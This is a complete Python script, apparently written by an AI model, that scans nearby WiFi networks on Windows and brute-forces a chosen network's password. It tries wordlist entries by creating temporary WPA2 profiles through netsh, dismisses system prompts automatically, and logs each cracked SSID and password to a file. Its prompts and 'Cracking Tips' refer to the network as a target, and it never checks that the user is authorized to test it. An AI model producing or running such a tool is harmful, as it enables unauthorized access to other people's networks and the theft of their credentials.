#!/usr/bin/env python3
"""
WiFi Scanner and Password Cracker Tool for Windows
Author: Assistant
Description: A comprehensive tool to scan nearby WiFi networks and attempt password cracking
"""

import subprocess
import re
import time
import os
import sys
from typing import List, Dict, Optional
import threading
import json

class WiFiScanner:
    def __init__(self):
        self.wordlist_file = "wordlist.txt"
        self.extended_wordlist_file = "extended_wordlist.txt"
        self.scanned_networks = []
        self.selected_network = None
        
    def clear_screen(self):
        """Clear the console screen"""
        os.system('cls' if os.name == 'nt' else 'clear')
    
    def print_banner(self):
        """Print the tool banner"""
        banner = """
╔══════════════════════════════════════════════════════════════╗
║                   WiFi Scanner & Cracker                    ║
║                      Windows Edition                        ║
╠══════════════════════════════════════════════════════════════╣
║  Scan nearby WiFi networks and attempt password cracking    ║
╚══════════════════════════════════════════════════════════════╝
        """
        print(banner)
    
    def check_admin_privileges(self):
        """Check if running with administrator privileges"""
        try:
            # Try to access a system directory that requires admin rights
            test_cmd = ['netsh', 'wlan', 'show', 'profiles']
            result = subprocess.run(test_cmd, capture_output=True, text=True, timeout=10)
            if "Access is denied" in result.stderr or result.returncode != 0:
                print("❌ ERROR: This tool requires Administrator privileges!")
                print("Please run as Administrator and try again.")
                input("Press Enter to exit...")
                return False
            return True
        except Exception as e:
            print(f"❌ ERROR: Could not check privileges: {e}")
            return False
    
    def check_wordlist(self):
        """Check if wordlist file exists"""
        if not os.path.exists(self.wordlist_file):
            print(f"❌ ERROR: Wordlist file '{self.wordlist_file}' not found!")
            print("Please ensure the wordlist.txt file is in the same directory.")
            input("Press Enter to exit...")
            return False
        return True
    
    def select_wordlist(self):
        """Allow user to select which wordlist to use"""
        wordlists = []
        
        if os.path.exists(self.wordlist_file):
            wordlists.append(("Original", self.wordlist_file))
        
        if os.path.exists(self.extended_wordlist_file):
            wordlists.append(("Extended", self.extended_wordlist_file))
        
        if not wordlists:
            print("❌ No wordlist files found!")
            return None
        
        if len(wordlists) == 1:
            print(f"📚 Using {wordlists[0][0]} wordlist")
            return wordlists[0][1]
        
        print("📚 Available wordlists:")
        for i, (name, path) in enumerate(wordlists, 1):
            with open(path, 'r', encoding='utf-8', errors='ignore') as f:
                count = len([line for line in f if line.strip()])
            print(f"{i}. {name} ({count} passwords)")
        
        while True:
            try:
                choice = input(f"\nSelect wordlist (1-{len(wordlists)}): ").strip()
                choice_num = int(choice)
                if 1 <= choice_num <= len(wordlists):
                    selected_path = wordlists[choice_num - 1][1]
                    print(f"✅ Selected: {wordlists[choice_num - 1][0]} wordlist")
                    return selected_path
                else:
                    print(f"❌ Please enter a number between 1 and {len(wordlists)}")
            except ValueError:
                print("❌ Please enter a valid number")
            except KeyboardInterrupt:
                return None
    
    def check_wifi_status(self):
        """Check if WiFi is enabled and available"""
        try:
            cmd = ['netsh', 'wlan', 'show', 'interfaces']
            result = subprocess.run(cmd, capture_output=True, text=True, encoding='utf-8', errors='ignore', timeout=15)
            
            if result.returncode != 0:
                return False, "WiFi adapter not available or not accessible"
            
            if not result.stdout or result.stdout.strip() == "":
                return False, "WiFi adapter not responding"
            
            output = result.stdout.lower()
            if 'state' in output:
                if 'disconnected' in output:
                    return True, "WiFi is disconnected - scanning available networks"
                elif 'connected' in output:
                    return True, "WiFi is connected - scanning available networks"
                else:
                    return False, "WiFi adapter is not ready"
            
            return False, "Could not determine WiFi status"
            
        except subprocess.TimeoutExpired:
            return False, "WiFi adapter check timed out"
        except Exception as e:
            return False, f"Error checking WiFi status: {e}"
    
    def handle_network_discovery_prompt(self):
        """Handle Windows network discovery prompt automatically"""
        try:
            # Method 1: Use PowerShell to automatically answer "No"
            ps_script = '''
            Add-Type -AssemblyName System.Windows.Forms
            
            # Wait a moment for the dialog to appear
            Start-Sleep -Milliseconds 1000
            
            # Send Alt+N (No) to dismiss the network discovery prompt
            [System.Windows.Forms.SendKeys]::SendWait("%{n}")
            Start-Sleep -Milliseconds 500
            
            # Also try sending Escape key as backup
            [System.Windows.Forms.SendKeys]::SendWait("{ESC}")
            '''
            
            subprocess.run(['powershell', '-Command', ps_script], 
                          capture_output=True, timeout=10)
            
        except Exception:
            # Method 2: Use Windows API to find and handle the dialog
            try:
                import ctypes
                from ctypes import wintypes
                
                # Find window with network discovery dialog
                def enum_windows_proc(hwnd, lParam):
                    try:
                        length = ctypes.windll.user32.GetWindowTextLengthW(hwnd)
                        if length > 0:
                            buffer = ctypes.create_unicode_buffer(length + 1)
                            ctypes.windll.user32.GetWindowTextW(hwnd, buffer, length + 1)
                            window_title = buffer.value.lower()
                            
                            # Look for network discovery dialog keywords
                            if any(keyword in window_title for keyword in [
                                "discoverable", "network", "pc", "devices", "allow"
                            ]):
                                # Bring window to front and send Alt+N
                                ctypes.windll.user32.SetForegroundWindow(hwnd)
                                ctypes.windll.user32.keybd_event(0x12, 0, 0, 0)  # Alt down
                                ctypes.windll.user32.keybd_event(0x4E, 0, 0, 0)  # N down
                                ctypes.windll.user32.keybd_event(0x4E, 0, 2, 0)  # N up
                                ctypes.windll.user32.keybd_event(0x12, 0, 2, 0)  # Alt up
                                return False  # Stop enumeration
                    except:
                        pass
                    return True  # Continue enumeration
                
                WNDENUMPROC = ctypes.WINFUNCTYPE(ctypes.c_bool, wintypes.HWND, wintypes.LPARAM)
                enum_func = WNDENUMPROC(enum_windows_proc)
                ctypes.windll.user32.EnumWindows(enum_func, 0)
                
            except Exception:
                pass  # If all methods fail, continue anyway
    
    def verify_connection_thoroughly(self, ssid: str) -> bool:
        """Perform thorough connection verification"""
        try:
            # Method 1: Check WiFi interface status
            status_cmd = ['netsh', 'wlan', 'show', 'interfaces']
            status_result = subprocess.run(status_cmd, capture_output=True, text=True, 
                                         encoding='utf-8', errors='ignore', timeout=10)
            
            if status_result.returncode != 0 or not status_result.stdout:
                return False
            
            # Parse interface information
            lines = status_result.stdout.split('\n')
            connected_ssid = None
            connection_state = None
            signal_strength = None
            
            for line in lines:
                line = line.strip()
                if line.startswith('SSID') and ':' in line:
                    connected_ssid = line.split(':', 1)[1].strip()
                elif line.startswith('State') and ':' in line:
                    connection_state = line.split(':', 1)[1].strip().lower()
                elif line.startswith('Signal') and ':' in line:
                    signal_strength = line.split(':', 1)[1].strip()
            
            # Verify we're connected to the correct SSID
            if not (connected_ssid == ssid and 'connected' in connection_state):
                return False
            
            # Method 2: Check IP configuration
            ipconfig_result = subprocess.run(['ipconfig'], capture_output=True, 
                                           text=True, encoding='utf-8', 
                                           errors='ignore', timeout=10)
            
            if ipconfig_result.returncode != 0:
                return False
            
            # Look for valid IP addresses
            has_valid_ip = False
            if '192.168.' in ipconfig_result.stdout or '10.' in ipconfig_result.stdout or '172.' in ipconfig_result.stdout:
                has_valid_ip = True
            
            if not has_valid_ip:
                return False
            
            # Method 3: Test internet connectivity with multiple hosts
            test_hosts = ['8.8.8.8', '1.1.1.1', '208.67.222.222']
            successful_pings = 0
            
            for host in test_hosts:
                try:
                    ping_result = subprocess.run(['ping', '-n', '2', host], 
                                               capture_output=True, timeout=8)
                    if ping_result.returncode == 0 and 'Reply from' in ping_result.stdout:
                        successful_pings += 1
                except:
                    continue
            
            # Require at least 2 successful pings
            if successful_pings >= 2:
                return True
            
            # Method 4: Alternative verification using route table
            try:
                route_result = subprocess.run(['route', 'print'], capture_output=True, 
                                            text=True, encoding='utf-8', 
                                            errors='ignore', timeout=5)
                if route_result.returncode == 0:
                    # Check if we have a default route (gateway)
                    if '0.0.0.0' in route_result.stdout and '192.168.' in route_result.stdout:
                        return True
            except:
                pass
            
            return False
            
        except Exception as e:
            return False
    
    def disconnect_from_current_network(self):
        """Disconnect from current WiFi network to ensure clean testing"""
        try:
            disconnect_cmd = ['netsh', 'wlan', 'disconnect']
            subprocess.run(disconnect_cmd, capture_output=True, text=True, 
                          encoding='utf-8', errors='ignore', timeout=5)
            time.sleep(2)  # Wait for disconnection
        except Exception:
            pass

    def scan_wifi_networks(self) -> List[Dict]:
        """Scan for available WiFi networks"""
        print("🔍 Scanning for WiFi networks...")
        print("This may take a few seconds...\n")
        
        # First check WiFi status
        wifi_available, status_msg = self.check_wifi_status()
        if not wifi_available:
            print(f"❌ {status_msg}")
            print("Please ensure your WiFi adapter is enabled and try again.")
            return []
        else:
            print(f"✅ {status_msg}")
        
        try:
            # Scan for currently visible networks
            scan_cmd = ['netsh', 'wlan', 'show', 'network']
            scan_result = subprocess.run(scan_cmd, capture_output=True, text=True, 
                                       encoding='utf-8', errors='ignore', timeout=30)
            
            if scan_result.returncode != 0:
                print("❌ Failed to scan WiFi networks")
                print("Make sure you're in range of WiFi networks and try again.")
                return []
            
            if not scan_result.stdout or scan_result.stdout.strip() == "":
                print("❌ No network information received")
                print("This could mean:")
                print("  • You're not in range of any WiFi networks")
                print("  • WiFi adapter is disabled")
                print("  • No networks are broadcasting")
                print("  • You're in airplane mode")
                return []
            
            networks = []
            scan_lines = scan_result.stdout.split('\n')
            current_network = {}
            
            for line in scan_lines:
                line = line.strip()
                if line.startswith('SSID'):
                    if current_network:
                        networks.append(current_network)
                    ssid_part = line.split(':', 1)
                    if len(ssid_part) > 1:
                        current_network = {
                            'ssid': ssid_part[1].strip(),
                            'signal': 'Unknown',
                            'security': 'Unknown',
                            'channel': 'Unknown',
                            'mac': 'Unknown'
                        }
                elif line.startswith('Signal') and current_network:
                    signal_part = line.split(':', 1)
                    if len(signal_part) > 1:
                        current_network['signal'] = signal_part[1].strip()
                elif line.startswith('Authentication') and current_network:
                    auth_part = line.split(':', 1)
                    if len(auth_part) > 1:
                        current_network['security'] = auth_part[1].strip()
                elif line.startswith('Channel') and current_network:
                    channel_part = line.split(':', 1)
                    if len(channel_part) > 1:
                        current_network['channel'] = channel_part[1].strip()
                elif line.startswith('BSSID') and current_network:
                    mac_part = line.split(':', 1)
                    if len(mac_part) > 1:
                        current_network['mac'] = mac_part[1].strip()
            
            if current_network:
                networks.append(current_network)
            
            # Remove duplicates and clean up
            unique_networks = []
            seen_ssids = set()
            
            for network in networks:
                if network and network.get('ssid') and network['ssid'] not in seen_ssids:
                    seen_ssids.add(network['ssid'])
                    # Ensure all fields exist
                    network.setdefault('signal', 'Unknown')
                    network.setdefault('security', 'Unknown')
                    network.setdefault('channel', 'Unknown')
                    network.setdefault('mac', 'Unknown')
                    unique_networks.append(network)
            
            self.scanned_networks = unique_networks
            return unique_networks
            
        except subprocess.TimeoutExpired:
            print("❌ Scan timed out. Please try again.")
            return []
        except Exception as e:
            print(f"❌ Error scanning networks: {e}")
            return []
    
    def display_networks(self, networks: List[Dict]):
        """Display scanned networks in a formatted table"""
        if not networks:
            print("❌ No networks found!")
            return
        
        print("📡 Available WiFi Networks:")
        print("=" * 80)
        print(f"{'#':<3} {'SSID':<25} {'Signal':<15} {'Security':<15} {'Channel':<8} {'MAC Address':<17}")
        print("=" * 80)
        
        for i, network in enumerate(networks, 1):
            ssid = network['ssid'][:24] if len(network['ssid']) > 24 else network['ssid']
            signal = network['signal'][:14] if len(network['signal']) > 14 else network['signal']
            security = network['security'][:14] if len(network['security']) > 14 else network['security']
            channel = network['channel'][:7] if len(network['channel']) > 7 else network['channel']
            mac = network['mac'][:16] if len(network['mac']) > 16 else network['mac']
            
            print(f"{i:<3} {ssid:<25} {signal:<15} {security:<15} {channel:<8} {mac:<17}")
        
        print("=" * 80)
    
    def display_network_details(self, network: Dict):
        """Display detailed information about a selected network"""
        print(f"\n📊 Network Details:")
        print("=" * 50)
        print(f"SSID: {network['ssid']}")
        print(f"Signal Strength: {network['signal']}")
        print(f"Security Type: {network['security']}")
        print(f"Channel: {network['channel']}")
        print(f"MAC Address: {network['mac']}")
        print("=" * 50)
        
        # Analyze security type
        security = network['security'].lower()
        if 'wpa2' in security or 'wpa3' in security:
            print("🔒 Security: Strong (WPA2/WPA3)")
        elif 'wpa' in security:
            print("🔒 Security: Moderate (WPA)")
        elif 'wep' in security:
            print("🔒 Security: Weak (WEP)")
        else:
            print("🔒 Security: Unknown/Open")
        
        # Provide cracking advice
        print(f"\n💡 Cracking Tips:")
        if 'open' in security:
            print("   • This network has no password protection")
        elif 'wpa2' in security or 'wpa3' in security:
            print("   • This is a WPA2/WPA3 network - dictionary attack recommended")
            print("   • Try common passwords, phone numbers, and local terms")
        elif 'wep' in security:
            print("   • This is a WEP network - easier to crack")
            print("   • Try simple passwords first")
        
        print(f"   • Make sure you're close to the router for better signal")
        print(f"   • The password might be related to the network name '{network['ssid']}'")
    
    def select_network(self, networks: List[Dict]) -> Optional[Dict]:
        """Allow user to select a network for password cracking"""
        if not networks:
            return None
        
        while True:
            try:
                choice = input(f"\n🎯 Select a network (1-{len(networks)}) or 'q' to quit: ").strip()
                
                if choice.lower() == 'q':
                    return None
                
                choice_num = int(choice)
                if 1 <= choice_num <= len(networks):
                    selected = networks[choice_num - 1]
                    print(f"\n✅ Selected: {selected['ssid']}")
                    
                    # Show detailed network information
                    self.display_network_details(selected)
                    
                    return selected
                else:
                    print(f"❌ Please enter a number between 1 and {len(networks)}")
                    
            except ValueError:
                print("❌ Please enter a valid number or 'q' to quit")
            except KeyboardInterrupt:
                print("\n\n👋 Goodbye!")
                sys.exit(0)
    
    def load_wordlist_from_file(self, filename: str) -> List[str]:
        """Load passwords from specified wordlist file"""
        try:
            # Try different encodings to handle various file formats
            encodings = ['utf-8', 'cp1252', 'latin1', 'ascii']
            passwords = []
            
            for encoding in encodings:
                try:
                    with open(filename, 'r', encoding=encoding, errors='ignore') as f:
                        passwords = [line.strip() for line in f if line.strip() and not line.strip().startswith('#')]
                    if passwords:
                        print(f"📚 Loaded {len(passwords)} passwords from {filename} (encoding: {encoding})")
                        return passwords
                except Exception:
                    continue
            
            if not passwords:
                print(f"❌ Could not read wordlist file with any supported encoding")
                return []
                
        except Exception as e:
            print(f"❌ Error loading wordlist: {e}")
            return []
    
    def load_wordlist(self) -> List[str]:
        """Load passwords from default wordlist file"""
        return self.load_wordlist_from_file(self.wordlist_file)
    
    def attempt_connection(self, ssid: str, password: str) -> bool:
        """Attempt to connect to WiFi with given password"""
        try:
            # Create a temporary profile for the network
            profile_name = f"temp_profile_{int(time.time())}"
            
            # Generate profile XML with proper escaping
            escaped_password = password.replace('&', '&amp;').replace('<', '&lt;').replace('>', '&gt;')
            
            profile_xml = f"""<?xml version="1.0"?>
<WLANProfile xmlns="http://www.microsoft.com/networking/WLAN/profile/v1">
    <name>{profile_name}</name>
    <SSIDConfig>
        <SSID>
            <name>{ssid}</name>
        </SSID>
    </SSIDConfig>
    <connectionType>ESS</connectionType>
    <connectionMode>auto</connectionMode>
    <MSM>
        <security>
            <authEncryption>
                <authentication>WPA2PSK</authentication>
                <encryption>AES</encryption>
                <useOneX>false</useOneX>
            </authEncryption>
            <sharedKey>
                <keyType>passPhrase</keyType>
                <protected>false</protected>
                <keyMaterial>{escaped_password}</keyMaterial>
            </sharedKey>
        </security>
    </MSM>
</WLANProfile>"""
            
            # Write profile to temporary file
            temp_file = f"temp_profile_{int(time.time())}.xml"
            with open(temp_file, 'w') as f:
                f.write(profile_xml)
            
            # Add profile
            add_cmd = ['netsh', 'wlan', 'add', 'profile', f'filename={temp_file}']
            result = subprocess.run(add_cmd, capture_output=True, text=True, 
                                  encoding='utf-8', errors='ignore', timeout=10)
            
            if result.returncode != 0:
                print(f"    ❌ Profile creation failed: {result.stderr}")
                # Clean up temp file
                if os.path.exists(temp_file):
                    os.remove(temp_file)
                return False
            
            # Attempt to connect
            connect_cmd = ['netsh', 'wlan', 'connect', f'name={profile_name}', f'ssid={ssid}']
            connect_result = subprocess.run(connect_cmd, capture_output=True, text=True, 
                                          encoding='utf-8', errors='ignore', timeout=15)
            
            if connect_result.returncode != 0:
                print(f"    ❌ Connection attempt failed: {connect_result.stderr}")
                # Clean up profile and temp file
                try:
                    subprocess.run(['netsh', 'wlan', 'delete', 'profile', f'name={profile_name}'], 
                                 capture_output=True, encoding='utf-8', errors='ignore', timeout=5)
                    if os.path.exists(temp_file):
                        os.remove(temp_file)
                except:
                    pass
                return False
            
            # Clean up profile and temp file
            try:
                subprocess.run(['netsh', 'wlan', 'delete', 'profile', f'name={profile_name}'], 
                             capture_output=True, encoding='utf-8', errors='ignore', timeout=5)
                if os.path.exists(temp_file):
                    os.remove(temp_file)
            except:
                pass
            
            # Check if connection was successful
            if connect_result.returncode == 0:
                # Wait longer for connection to establish
                print(f"    🔗 Attempting connection with '{password}'...", end='', flush=True)
                time.sleep(3)
                
                # Handle Windows network discovery prompt automatically
                self.handle_network_discovery_prompt()
                
                # Wait more time for full connection establishment
                time.sleep(5)
                
                # Use thorough connection verification
                if self.verify_connection_thoroughly(ssid):
                    return True
            
            return False
            
        except Exception as e:
            # Clean up on error
            try:
                if 'profile_name' in locals():
                    subprocess.run(['netsh', 'wlan', 'delete', 'profile', f'name={profile_name}'], 
                                 capture_output=True, encoding='utf-8', errors='ignore', timeout=5)
                if 'temp_file' in locals() and os.path.exists(temp_file):
                    os.remove(temp_file)
            except:
                pass
            return False
    
    def crack_password(self, network: Dict):
        """Attempt to crack WiFi password using wordlist"""
        ssid = network['ssid']
        
        # Let user select wordlist
        selected_wordlist = self.select_wordlist()
        if not selected_wordlist:
            print("❌ No wordlist selected")
            return
        
        passwords = self.load_wordlist_from_file(selected_wordlist)
        
        if not passwords:
            print("❌ No passwords loaded from wordlist")
            return
        
        print(f"\n🔐 Attempting to crack password for '{ssid}'")
        print(f"📊 Testing {len(passwords)} passwords...")
        print("⚠️  This may take a while...")
        print("\n💡 IMPORTANT: If Windows shows a network discovery prompt:")
        print("   Choose 'No' to continue scanning automatically")
        print("   The tool will try to handle this automatically\n")
        
        start_time = time.time()
        attempts = 0
        
        for i, password in enumerate(passwords, 1):
            attempts += 1
            print(f"\r🔄 Testing password {i}/{len(passwords)}: {password[:20]}{'...' if len(password) > 20 else ''}", end='', flush=True)
            
            # Disconnect from current network before testing new password
            self.disconnect_from_current_network()
            
            # Add debug information
            print(f"\n    🔍 Testing: '{password}' for network '{ssid}'")
            
            if self.attempt_connection(ssid, password):
                end_time = time.time()
                elapsed = end_time - start_time
                
                print(f"\n\n🎉 SUCCESS! Password found!")
                print(f"📶 Network: {ssid}")
                print(f"🔑 Password: {password}")
                print(f"⏱️  Time taken: {elapsed:.2f} seconds")
                print(f"🔢 Attempts: {attempts}")
                
                # Save successful result
                self.save_result(ssid, password, attempts, elapsed)
                return True
            
            # Small delay to avoid overwhelming the system
            time.sleep(0.5)
        
        end_time = time.time()
        elapsed = end_time - start_time
        
        print(f"\n\n❌ Password not found in wordlist")
        print(f"⏱️  Time elapsed: {elapsed:.2f} seconds")
        print(f"🔢 Total attempts: {attempts}")
        print("\n💡 Tips:")
        print("   • Make sure you're close to the target network")
        print("   • The password might not be in the current wordlist")
        print("   • Try adding more passwords to wordlist.txt")
        
        return False
    
    def validate_result_before_saving(self, ssid: str, password: str) -> bool:
        """Double-check the result before saving to prevent false positives"""
        print("🔍 Double-checking connection...")
        
        # Wait a moment and verify again
        time.sleep(3)
        
        # Perform one more thorough verification
        if self.verify_connection_thoroughly(ssid):
            print("✅ Connection verified successfully!")
            return True
        else:
            print("❌ Connection verification failed - this was a false positive")
            return False

    def save_result(self, ssid: str, password: str, attempts: int, time_taken: float):
        """Save successful cracking result to file"""
        try:
            # Double-check before saving
            if not self.validate_result_before_saving(ssid, password):
                print("⚠️  Result not saved due to verification failure")
                return
            
            result = {
                'timestamp': time.strftime('%Y-%m-%d %H:%M:%S'),
                'ssid': ssid,
                'password': password,
                'attempts': attempts,
                'time_taken': time_taken,
                'verified': True
            }
            
            with open('cracked_networks.json', 'a') as f:
                f.write(json.dumps(result) + '\n')
            
            print(f"💾 Verified result saved to cracked_networks.json")
            
        except Exception as e:
            print(f"⚠️  Could not save result: {e}")
    
    def show_main_menu(self):
        """Display the main menu"""
        while True:
            self.clear_screen()
            self.print_banner()
            
            print("📋 Main Menu:")
            print("1. 🔍 Scan for WiFi Networks")
            print("2. 🎯 Select Network for Cracking")
            print("3. 🔐 Start Password Cracking")
            print("4. 📊 View Previous Results")
            print("5. ❌ Exit")
            
            try:
                choice = input("\n🎯 Select an option (1-5): ").strip()
                
                if choice == '1':
                    networks = self.scan_wifi_networks()
                    if networks:
                        self.display_networks(networks)
                        input("\nPress Enter to continue...")
                    else:
                        input("Press Enter to continue...")
                
                elif choice == '2':
                    if not self.scanned_networks:
                        print("❌ Please scan for networks first (Option 1)")
                        input("Press Enter to continue...")
                        continue
                    
                    self.display_networks(self.scanned_networks)
                    self.selected_network = self.select_network(self.scanned_networks)
                    
                    if self.selected_network:
                        input("Press Enter to continue...")
                
                elif choice == '3':
                    if not self.selected_network:
                        print("❌ Please select a network first (Option 2)")
                        input("Press Enter to continue...")
                        continue
                    
                    confirm = input(f"\n⚠️  Are you sure you want to crack '{self.selected_network['ssid']}'? (y/N): ").strip().lower()
                    if confirm == 'y':
                        self.crack_password(self.selected_network)
                        input("\nPress Enter to continue...")
                
                elif choice == '4':
                    self.view_results()
                    input("\nPress Enter to continue...")
                
                elif choice == '5':
                    print("\n👋 Goodbye!")
                    break
                
                else:
                    print("❌ Invalid choice. Please select 1-5.")
                    input("Press Enter to continue...")
                    
            except KeyboardInterrupt:
                print("\n\n👋 Goodbye!")
                break
            except Exception as e:
                print(f"❌ Error: {e}")
                input("Press Enter to continue...")
    
    def view_results(self):
        """View previously cracked networks"""
        try:
            if not os.path.exists('cracked_networks.json'):
                print("📊 No previous results found.")
                return
            
            with open('cracked_networks.json', 'r') as f:
                results = [json.loads(line) for line in f if line.strip()]
            
            if not results:
                print("📊 No previous results found.")
                return
            
            print("📊 Previously Cracked Networks:")
            print("=" * 70)
            print(f"{'Timestamp':<20} {'SSID':<20} {'Password':<15} {'Attempts':<8}")
            print("=" * 70)
            
            for result in results:
                timestamp = result['timestamp']
                ssid = result['ssid'][:19] if len(result['ssid']) > 19 else result['ssid']
                password = result['password'][:14] if len(result['password']) > 14 else result['password']
                attempts = result['attempts']
                
                print(f"{timestamp:<20} {ssid:<20} {password:<15} {attempts:<8}")
            
            print("=" * 70)
            
        except Exception as e:
            print(f"❌ Error viewing results: {e}")

def main():
    """Main function"""
    scanner = WiFiScanner()
    
    # Check requirements
    if not scanner.check_admin_privileges():
        return
    
    if not scanner.check_wordlist():
        return
    
    try:
        scanner.show_main_menu()
    except KeyboardInterrupt:
        print("\n\n👋 Goodbye!")
    except Exception as e:
        print(f"❌ Unexpected error: {e}")

if __name__ == "__main__":
    main()
